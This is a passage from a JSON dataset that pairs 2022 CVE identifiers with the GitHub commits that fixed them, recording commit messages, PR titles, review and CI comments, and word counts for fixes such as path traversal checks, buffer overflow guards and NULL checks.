            "other_info": "Bugfix/check token for edit locally requests @mgallien Please do not forget clean-up the history AppImage file: [nextcloud-PR-5039-f9949ee0de1b8a42412f528dc1f64e080eb44316-x86_64.AppImage](https://github.com/nextcloud-desktop-bot/ci-builds/releases/download/PR-5039/nextcloud-PR-5039-f9949ee0de1b8a42412f528dc1f64e080eb44316-x86_64.AppImage) <br/><br/>To test this change/fix you can simply download above AppImage file and test it. <br/><br/>Please make sure to quit your existing Nextcloud app and backup your data.  SonarCloud Quality Gate failed.&nbsp; &nbsp; [![Quality Gate failed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/failed-16px.png 'Quality Gate failed')](https://sonarcloud.io/dashboard?id=nextcloud_desktop&pullRequest=5039)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=VULNERABILITY)  \n[![Security Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=SECURITY_HOTSPOT) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/security_hotspots?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=CODE_SMELL) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=CODE_SMELL) [9 Code Smells](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5039&resolved=false&types=CODE_SMELL)\n\n[![46.2%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/40-16px.png '46.2%')](https://sonarcloud.io/component_measures?id=nextcloud_desktop&pullRequest=5039&metric=new_coverage&view=list) [46.2% Coverage](https://sonarcloud.io/component_measures?id=nextcloud_desktop&pullRequest=5039&metric=new_coverage&view=list)  \n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=nextcloud_desktop&pullRequest=5039&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=nextcloud_desktop&pullRequest=5039&metric=new_duplicated_lines_density&view=list)\n\n # [Codecov](https://codecov.io/gh/nextcloud/desktop/pull/5039?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) Report\n> Merging [#5039](https://codecov.io/gh/nextcloud/desktop/pull/5039?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) (f9949ee) into [master](https://codecov.io/gh/nextcloud/desktop/commit/bde2f90de914e43bbb72a2103828112468326af9?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) (bde2f90) will **increase** coverage by `0.03%`.\n> The diff coverage is `64.91%`.\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@            Coverage Diff             @@\n##           master    #5039      +/-   ##\n==========================================\n+ Coverage   57.34%   57.37%   +0.03%     \n==========================================\n  Files         138      138              \n  Lines       17391    17418      +27     \n==========================================\n+ Hits         9972     9993      +21     \n- Misses       7419     7425       +6     \n```\n\n\n\n| [Impacted Files](https://codecov.io/gh/nextcloud/desktop/pull/5039?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) | Coverage \u0394 | |\n|---|---|---|\n| [src/libsync/networkjobs.h](https://codecov.io/gh/nextcloud/desktop/pull/5039/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvbmV0d29ya2pvYnMuaA==) | `4.76% <50.00%> (-0.24%)` | :arrow_down: |\n| [src/libsync/networkjobs.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5039/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvbmV0d29ya2pvYnMuY3Bw) | `50.28% <65.45%> (+0.28%)` | :arrow_up: |\n| [src/libsync/discovery.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5039/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvZGlzY292ZXJ5LmNwcA==) | `84.05% <0.00%> (+0.28%)` | :arrow_up: |\n| [src/libsync/propagateremotemkdir.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5039/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvcHJvcGFnYXRlcmVtb3RlbWtkaXIuY3Bw) | `65.73% <0.00%> (+0.69%)` | :arrow_up: |\n| [src/libsync/propagatorjobs.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5039/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvcHJvcGFnYXRvcmpvYnMuY3Bw) | `73.23% <0.00%> (+1.40%)` | :arrow_up: |\n\n</details> /backport to stable-3.6",
            "pr_title_words": 6,
            "comments_words": 207,
            "total_other_info_words": 213
        },
        {
            "cve-id": "CVE-2022-4773",
            "commit_url": "https://github.com/HolgerHees/cloudsync/commit/3ad796833398af257c28e0ebeade68518e0e612a",
            "commit_msg": "vuln-fix: Partial Path Traversal Vulnerability\n\nThis fixes a partial path traversal vulnerability.\n\nReplaces `dir.getCanonicalPath().startsWith(parent.getCanonicalPath())`, which is vulnerable to partial path traversal attacks, with the more secure `dir.getCanonicalFile().toPath().startsWith(parent.getCanonicalFile().toPath())`.\n\nTo demonstrate this vulnerability, consider `\"/usr/outnot\".startsWith(\"/usr/out\")`.\nThe check is bypassed although `/outnot` is not under the `/out` directory.\nIt's important to understand that the terminating slash may be removed when using various `String` representations of the `File` object.\nFor example, on Linux, `println(new File(\"/var\"))` will print `/var`, but `println(new File(\"/var\", \"/\")` will print `/var/`;\nhowever, `println(new File(\"/var\", \"/\").getCanonicalPath())` will print `/var`.\n\nWeakness: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nSeverity: Medium\nCVSSS: 6.1\nDetection: CodeQL & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.PartialPathTraversalVulnerability)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/13\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 123,
            "other_info": "[SECURITY] Fix Partial Path Traversal Vulnerability",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-44262",
            "commit_url": "https://github.com/ff4j/ff4j/commit/991df72725f78adbc413d9b0fbb676201f1882e0",
            "commit_msg": "fix: Validate FlippingStrategy in various parsers (#624)",
            "commit_msg_words": 7,
            "other_info": "fix: CVE-2022-44262 (#624) the RCE is present in different points of the FF4j project.\r\nAll inputs must be validated with the proper \"isAssignableFrom\" method before executing \"newInstance\" of Class.forName(\"someinputstring\")\r\nThis applies to both property and strategy parsing/creating.\r\n\r\nExamples: \r\nff4j-core:\r\norg.ff4j.utils.MappingUtil line 183\r\norg.ff4j.conf.XmlParser line 387\r\n\r\nff4j-config-yaml:\r\norg.ff4j.parser.yaml.YamlParser line 175",
            "pr_title_words": 3,
            "comments_words": 46,
            "total_other_info_words": 49
        },
        {
            "cve-id": "CVE-2022-24861",
            "commit_url": "https://github.com/vran-dev/databasir/commit/ca22a8fef7a31c0235b0b2951260a7819b89993b",
            "commit_msg": "fix some security bug (#103)\n\n* fix: use hard-code secret\r\n\r\n* feat: add driver class validate\r\n\r\n* feat: optimize drvier resource code\r\n\r\n* fix:ut failed",
            "commit_msg_words": 25,
            "other_info": "fix some security bug",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2022-41972",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/e871d479962d747465a7d8d58c5352212a4e6e0d",
            "commit_msg": "Add missing NULL check in ble-l2cap.",
            "commit_msg_words": 6,
            "other_info": "Add missing NULL check in ble-l2cap",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-45868",
            "commit_url": "https://github.com/h2database/h2database/commit/23ee3d0b973923c135fa01356c8eaed40b895393",
            "commit_msg": "Disallow plain webAdminPassword values to force usage of hashes",
            "commit_msg_words": 9,
            "other_info": "Disallow plain webAdminPassword values to force usage of hashes +1",
            "pr_title_words": 9,
            "comments_words": 1,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2022-25885",
            "commit_url": "https://github.com/julianhille/MuhammaraJS/commit/0a6427eec82ef2978995e453de2dc0d6224dd46c",
            "commit_msg": "Fix createWriter cpp / crash / npe when using null as stream object (#190)\n\nFix createWriter cpp / crash / npe when using null as stream object\r\n\r\nFixes #188",
            "commit_msg_words": 29,
            "other_info": "Fix createWriter cpp / crash / npe when using null as stream object",
            "pr_title_words": 13,
            "comments_words": 0,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2022-30049",
            "commit_url": "https://github.com/getrebuild/rebuild/commit/a44bc6fd61c72b2edd525f3f2eadc0ed507d17ee",
            "commit_msg": "fix #460",
            "commit_msg_words": 2,
            "other_info": "Better 2.9",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-40497",
            "commit_url": "https://github.com/wazuh/wazuh/commit/065b175952c344d00a4af9cc9f5d28e964ce33fd",
            "commit_msg": "Fix typo in the AR directory traversal error",
            "commit_msg_words": 8,
            "other_info": "Fix arbitrary code execution flaw in Active Response ## QA review\r\n\r\n- **Type**: Manual testing.\r\n- **Status**: Approved but proposed improvements  \ud83d\udfe1 \r\n- **Testing issue**: https://github.com/wazuh/wazuh-qa/issues/3257\r\n- **Comments**: Everything seems to be working properly. The following issue https://github.com/wazuh/wazuh/issues/14831 has been opened for:\r\n  - Improve consistency between AR socket response and API when entering a custom command. Some commands are accepted in the socket but not through the API.\r\n  - Delete duplicate WARNING message.",
            "pr_title_words": 8,
            "comments_words": 65,
            "total_other_info_words": 73
        },
        {
            "cve-id": "CVE-2022-25308",
            "commit_url": "https://github.com/fribidi/fribidi/commit/ad3a19e6372b1e667128ed1ea2f49919884587e1",
            "commit_msg": "Fix the stack buffer overflow issue\n\nstrlen() could returns 0. Without a conditional check for len,\naccessing S_ pointer with len - 1 may causes a stack buffer overflow.\n\nAddressSanitizer reports this like:\n==1219243==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffdce043c1f at pc 0x000000403547 bp 0x7ffdce0\n43b30 sp 0x7ffdce043b28\nREAD of size 1 at 0x7ffdce043c1f thread T0\n    #0 0x403546 in main ../bin/fribidi-main.c:393\n    #1 0x7f226804e58f in __libc_start_call_main (/lib64/libc.so.6+0x2d58f)\n    #2 0x7f226804e648 in __libc_start_main_impl (/lib64/libc.so.6+0x2d648)\n    #3 0x4036f4 in _start (/tmp/fribidi/build/bin/fribidi+0x4036f4)\n\nAddress 0x7ffdce043c1f is located in stack of thread T0 at offset 63 in frame\n    #0 0x4022bf in main ../bin/fribidi-main.c:193\n\n  This frame has 5 object(s):\n    [32, 36) 'option_index' (line 233)\n    [48, 52) 'base' (line 386)\n    [64, 65064) 'S_' (line 375) <== Memory access at offset 63 underflows this variable\n    [65328, 130328) 'outstring' (line 385)\n    [130592, 390592) 'logical' (line 384)\n\nThis fixes https://github.com/fribidi/fribidi/issues/181",
            "commit_msg_words": 136,
            "other_info": "Fix the stack buffer overflow issue",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-41751",
            "commit_url": "https://github.com/Matthias-Wandel/jhead/commit/3fe905cf674f8dbac8a89e58cee1b4850abf9530",
            "commit_msg": "Check for dangerous filenames in RegenerateThumbnail",
            "commit_msg_words": 6,
            "other_info": "Fix CVE 2022 41751",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2022-1240",
            "commit_url": "https://github.com/radareorg/radare2/commit/ca8d8b39f3e34a4fd943270330b80f1148129de4",
            "commit_msg": "Fix oobread in the macho parser ##crash\n\n* Reported by @Han0nly via huntr.dev\n* Reproducers: heapoverflow1\n* BountyID: e589bd97-4c74-4e79-93b5-0951a281facc",
            "commit_msg_words": 19,
            "other_info": "Fix oobread in the macho parser ##crash",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-1237",
            "commit_url": "https://github.com/radareorg/radare2/commit/2d782cdaa2112c10b8dd5e7a93c134b2ada9c1a6",
            "commit_msg": "Fix oobread segfaults in the NE bin parser ##crash\n\n* Reported by @han0nly via huntr.dev\n* Reproducers: seed1 seed2\n* BountyID: ad3c9c4c-76e7-40c8-bd4a-c095acd8bb40",
            "commit_msg_words": 22,
            "other_info": "Fix oobread segfaults in the NE bin parser ##crash",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2022-26068",
            "commit_url": "https://github.com/pistacheio/pistache/commit/4ba6da096611d11849aa37ee342c032a306ee885",
            "commit_msg": "fix(swagger/security): ensure that the requested file is in the UI directory\n\nThe Rest::Swagger class didn't check if the file asked from the user was\ncontained in the UI directory, thus allowing users to access arbitrary\nfiles in the filesystem.\n\nThanks to Kirill Efimov (@Kirill89) and the Snyk Security team for\nfinding and reporting the vulnerability to the Pistache team.",
            "commit_msg_words": 59,
            "other_info": "fix(swagger/security): ensure that the requested file is in the UI directory abidiff reports a potential ABI change, but that's probably related to the inclusion of `<filesystem>`. It exited with status 4, that according to the [manual](https://sourceware.org/libabigail/manual/abidiff.html#return-values) maps to `ABIDIFF_ABI_CHANGE`, meaning that the ABI changed but non necessarily in a breaking manner. As all the changes have been applied to internal code, I believe that this failure can be ignored.\r\n\r\nEdit: they seem template instantiations",
            "pr_title_words": 11,
            "comments_words": 63,
            "total_other_info_words": 74
        },
        {
            "cve-id": "CVE-2022-26181",
            "commit_url": "https://github.com/dropbox/lepton/commit/4e591ffd0127ac064c4749e523458a923b29cc75",
            "commit_msg": "Fix wild free.\n\n`huffdata` is initially allocated using `aligned_dealloc` but can be\nreplaced with `data2` which is allocated using `custom_calloc`.\nThis can cause a wild free when `aligned_dealloc(huffdata)` is called.\nFix by replacing allocation sites with aligned_alloc.\n\nNoticed and fixed a similar problem with `hdrdata`.",
            "commit_msg_words": 45,
            "other_info": "Fix wild free.",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-38155",
            "commit_url": "https://github.com/Samsung/mTower/commit/236357f0e756f0fd2120a1a78cf573765471e088",
            "commit_msg": "Fixed CVE-2022-38155, CVE-2022-40762\n\nSigned-off-by: Taras Drozdovskyi <t.drozdovsky@samsung.com>",
            "commit_msg_words": 7,
            "other_info": "Fixed CVE-2022-38155, CVE-2022-40762",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-1296",
            "commit_url": "https://github.com/radareorg/radare2/commit/153bcdc29f11cd8c90e7d639a7405450f644ddb6",
            "commit_msg": "Fix oobread in NE parser ##crash\n\n* Reported by @hmsec via huntr.dev\n* Reproducer: necrash\n* BountyID: 52b57274-0e1a-4d61-ab29-1373b555fea0/",
            "commit_msg_words": 18,
            "other_info": "Fix oobread in NE parser ##crash",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-4725",
            "commit_url": "https://github.com/aws-amplify/aws-sdk-android/commit/c3e6d69422e1f0c80fe53f2d757b8df97619af2b",
            "commit_msg": "fix(core): added fix for xml parser (#3100)\n\n* added fix for xml parser vulnerability\r\n\r\n* added fix for xml parser vulnerability\r\n\r\nCo-authored-by: Banji Jolaoso <banjij@amazon.com>",
            "commit_msg_words": 25,
            "other_info": "fix(core): added fix for xml parser",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-32546",
            "commit_url": "https://github.com/ImageMagick/ImageMagick/commit/f221ea0fa3171f0f4fdf74ac9d81b203b9534c23",
            "commit_msg": "Fixes #4985: 4e+26 is outside the range of representable values of type 'unsigned long' at coders/pcl.c:299 (#4986)\n\n* fix Division by zero in XMenuWidget() of MagickCore/widget.c\r\n\r\n* Fix memory leak in AnimateImageCommand() of MagickWand/animate.c and DisplayImageCommand() of MagickWand/display.c\r\n\r\n* fix Division by zero in ReadEnhMetaFile() of coders/emf.c\r\n\r\n* Resolve conflicts\r\n\r\n* fix issue: outside the range of representable values of type 'unsigned char' at coders/psd.c:1025\r\n\r\n* fix error: 4e+26 is outside the range of representable values of type 'unsigned long' at coders/pcl.c:299\r\n\r\nCo-authored-by: zhailiangliang <zhailiangliang@loongson.cn>",
            "commit_msg_words": 85,
            "other_info": "Fixes #4985: 4e+26 is outside the range of representable values of type 'unsigned long' at coders/pcl.c:299",
            "pr_title_words": 16,
            "comments_words": 0,
            "total_other_info_words": 16
        },
        {
            "cve-id": "CVE-2022-29021",
            "commit_url": "https://github.com/openrazer/openrazer/commit/7e8a04feb378a679f1bcdcae079a5100cc45663b",
            "commit_msg": "Fix oob memcpy in matrix_custom_frame methods\n\nAdjust row_length if it exeeds the arguments array",
            "commit_msg_words": 14,
            "other_info": "Fix oob memcpy matrix custom frame",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-23435",
            "commit_url": "https://github.com/koral--/android-gif-drawable/commit/9f0f0c89e6fa38548163771feeb4bde84b828887",
            "commit_msg": "Limit maximum length of comment",
            "commit_msg_words": 5,
            "other_info": "Limit maximum length of comment",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2022-23532",
            "commit_url": "https://github.com/neo4j-contrib/neo4j-apoc-procedures/commit/01e63ed2d187cd2a8aa1d78bf831ef0fdd69b522",
            "commit_msg": "4.4 export security fix (#3370)\n\n* [vFQk1rX0] Fix security issue\r\n\r\n* [vFQk1rX0] Add more test cases from PR review",
            "commit_msg_words": 19,
            "other_info": "4.4 export security fix",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2022-31018",
            "commit_url": "https://github.com/playframework/playframework/commit/15393b736df939e35e275af2347155f296c684f2",
            "commit_msg": "add depth limit for JSON form binding",
            "commit_msg_words": 7,
            "other_info": "[2.8.x] add depth limit for JSON form binding This was a backport of commit 825ff0292dedbf402dd026d767440d784e4049b2",
            "pr_title_words": 8,
            "comments_words": 7,
            "total_other_info_words": 15
        },
        {
            "cve-id": "CVE-2022-25638",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/08047b2d959ee5e21a4a2c672308f45fec61f059",
            "commit_msg": "Add checking to make sure key is present in all cases. Explicitly set `validSigAlgo` to zero with comment to clarify the default assumption.",
            "commit_msg_words": 23,
            "other_info": "Fix for mutual authentication to prevent mismatch of certificate and sigalgo",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2022-24830",
            "commit_url": "https://github.com/OpenClinica/OpenClinica/commit/6f864e86543f903bd20d6f9fc7056115106441f3",
            "commit_msg": "OC-17139: code  changes after code review",
            "commit_msg_words": 6,
            "other_info": "OC-17139 \ud83d\udc4d",
            "pr_title_words": 1,
            "comments_words": 1,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-34298",
            "commit_url": "https://github.com/OpenIdentityPlatform/OpenAM/commit/3b242fbd6bdc1e2fa2f07842213a6301a0a0b468",
            "commit_msg": "fix NT auth module vulnerability",
            "commit_msg_words": 5,
            "other_info": "fix NT auth module vulnerability",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2022-26127",
            "commit_url": "https://github.com/FRRouting/frr/commit/50044ec7fe129e0a74d3a679dd29fe17ce30e6bf",
            "commit_msg": "babeld: fix #10487 by adding a check on packet length\n\nThe body length of a packet should satisfy the condition:\npacketlen >= bodylen + 4. Otherwise, heap overflows may happen.\n\nSigned-off-by: whichbug <whichbug@github.com>",
            "commit_msg_words": 33,
            "other_info": "babeld: add a check for truncated packets Please update your git commit to match our standards - see the development workflow document? > Please update your git commit to match our standards - see the development workflow document?\r\n\r\nI am working on this. Thanks! <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3201/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3202/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3232/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n</details> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3233/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.",
            "pr_title_words": 7,
            "comments_words": 260,
            "total_other_info_words": 267
        },
        {
            "cve-id": "CVE-2022-25882",
            "commit_url": "https://github.com/onnx/onnx/commit/f369b0e859024095d721f1d1612da5a8fa38988d",
            "commit_msg": "Do not allow to read tensor's external_data outside the model directory (#4400)\n\n* Not allow to read tensor external_data outside the model directory\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\n* Fix formatting errors\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\n* Disable segfaulty test\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\n* Fix cpp tests\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\n* Fix UB while removing ../\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\n* Fix clang-format\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\n* Check for symlinks only on POSIX systems\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\n* Add specific to Windows external_data test\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\n* Change specific Windows external_data test decorator tofix mypy\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\n* Remove unused pathlib\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>\r\n\r\nSigned-off-by: jnovikov <johnnovikov0@gmail.com>",
            "commit_msg_words": 105,
            "other_info": "Do not allow to read tensor's external_data outside the model directory",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2022-28990",
            "commit_url": "https://github.com/wasm3/wasm3/commit/b8921b341d0d4a18f72f4d42caa9be839021c0b4",
            "commit_msg": "fix WASI API read/write pread/pwrite buffer overflow",
            "commit_msg_words": 7,
            "other_info": "fix WASI API read/write pread/pwrite buffer overflow",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-39319",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/11555828d2cf289b350baba5ad1f462f10b80b76",
            "commit_msg": "Fixed missing input buffer length check in urbdrc\n\n(cherry picked from commit 497df00f741dd4fc89292aaef2db7368aee45d0d)",
            "commit_msg_words": 13,
            "other_info": "length check fixes backport \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8282/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8299/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8302/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8308/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8315/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8318/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8330/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8338/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8342/",
            "pr_title_words": 4,
            "comments_words": 126,
            "total_other_info_words": 130
        },
        {
            "cve-id": "CVE-2022-1452",
            "commit_url": "https://github.com/radareorg/radare2/commit/ecc44b6a2f18ee70ac133365de0e509d26d5e168",
            "commit_msg": "Fix oobread in java parser ##crash\n\n* Reported by @bet4it via @huntrdev\n* BountyID c8f4c2de-7d96-4ad4-857a-c099effca2d6\n* Reproducer: bootstrap.class",
            "commit_msg_words": 18,
            "other_info": "Fix oobread crash in java parser ##crash",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-41954",
            "commit_url": "https://github.com/joniles/mpxj/commit/ae0af24345d79ad45705265d9927fe55e94a5721",
            "commit_msg": "vuln-fix: Temporary File Information Disclosure\n\n\n\nThis fixes temporary file information disclosure vulnerability due to the use\nof the vulnerable `File.createTempFile()` method. The vulnerability is fixed by\nusing the `Files.createTempFile()` method which sets the correct posix permissions.\n\nWeakness: CWE-377: Insecure Temporary File\nSeverity: Medium\nCVSSS: 5.5\nDetection: CodeQL & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.SecureTempFileCreation)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/18\n\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 63,
            "other_info": "[SECURITY] Fix Temporary File Information Disclosure Vulnerability\n Thanks for the PR. I've been assigned CVE-2022-41954 for this issue. I'll be making a new release of MPXJ containing this fix today.",
            "pr_title_words": 7,
            "comments_words": 23,
            "total_other_info_words": 30
        },
        {
            "cve-id": "CVE-2022-0699",
            "commit_url": "https://github.com/OSGeo/shapelib/commit/c75b9281a5b9452d92e1682bdfe6019a13ed819f",
            "commit_msg": "Remove double free() in contrib/shpsrt, issue #39\n\nThis fixes issue #39",
            "commit_msg_words": 11,
            "other_info": "Remove double free() in contrib/shpsrt, issue #39",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-1714",
